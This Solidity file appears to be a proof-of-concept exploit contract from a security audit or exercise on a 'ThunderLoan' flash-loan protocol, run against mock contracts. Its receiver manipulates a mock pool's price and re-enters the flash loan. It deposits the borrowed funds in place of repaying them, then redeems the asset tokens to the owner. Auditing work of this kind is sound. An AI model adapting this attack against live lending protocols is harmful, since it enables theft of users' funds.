// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import { IFlashLoanReceiver } from "../../../src/interfaces/IFlashLoanReceiver.sol";
import { IThunderLoan } from "../../../src/interfaces/IThunderLoan.sol";
import { ThunderLoan } from "src/protocol/ThunderLoan.sol";
import { BuffMockTSwap } from "test/mocks/BuffMockTSwap.sol";
import { console } from "forge-std/console.sol";
import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";

contract OracleDepositWithFlashLoanReceiver is IFlashLoanReceiver, Ownable {
    error MockFlashLoanReceiver__onlyOwner();
    error MockFlashLoanReceiver__onlyThunderLoan();

    using SafeERC20 for IERC20;

    address private s_owner;

    ThunderLoan s_thunderLoan;
    BuffMockTSwap s_pool;
    address repayAddress;

    uint256 s_balanceDuringFlashLoan;
    uint256 s_balanceAfterFlashLoan;

    bool attack;

    uint256 public fee1;
    uint256 public fee2;

    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;

    // token address
    address tokenA;
    address weth;

    constructor(address thunderLoan, address Pool, address _weth, address repay) Ownable(msg.sender) {
        s_owner = msg.sender;
        s_thunderLoan = ThunderLoan(thunderLoan);
        weth = _weth;
        s_pool = BuffMockTSwap(Pool);
        repayAddress = repay;
        s_balanceDuringFlashLoan = 0;
        attack = false;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /*initiator*/
        bytes calldata /*  params */
    )
        external
        returns (bool)
    {
        if (!attack) {
            fee1 = fee;
            attack = true;
            uint256 expectedOutputWeth = s_pool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(s_pool), 50e18);
            s_pool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, expectedOutputWeth, block.timestamp);

            // then we re enter the function flashloan, in order to go to the else branch of the if-else statement
            s_thunderLoan.flashloan(address(this), IERC20(token), amount, "");
        } else {
            fee2 = fee;
            // instead of using the `repay` function,
            // repay the flash loan twice in  here, we deposit as an LP in the flashLoan to gain Assest token.
            IERC20(token).approve(address(s_thunderLoan), amount * 2 + fee1 + fee2);
            s_thunderLoan.deposit(IERC20(token), amount * 2 + fee1 + fee2);
        }

        return true;
    }

    function withAssetToken(IERC20 _token) public onlyOwner {
        s_thunderLoan.redeem(_token, type(uint256).max);
        uint256 tokenBalanceOfContract = IERC20(_token).balanceOf(address(this));
        uint256 BeforetokenBalanceOfOwner = IERC20(_token).balanceOf(s_owner);
        _token.transfer(owner(), tokenBalanceOfContract);
        uint256 AftertokenBalanceOfOwner = IERC20(_token).balanceOf(s_owner);
        if (AftertokenBalanceOfOwner <= BeforetokenBalanceOfOwner) {
            revert MockFlashLoanReceiver__onlyOwner();
        }
    }

    function getBalanceDuring() external view returns (uint256) {
        return s_balanceDuringFlashLoan;
    }

    function getBalanceAfter() external view returns (uint256) {
        return s_balanceAfterFlashLoan;
    }
}
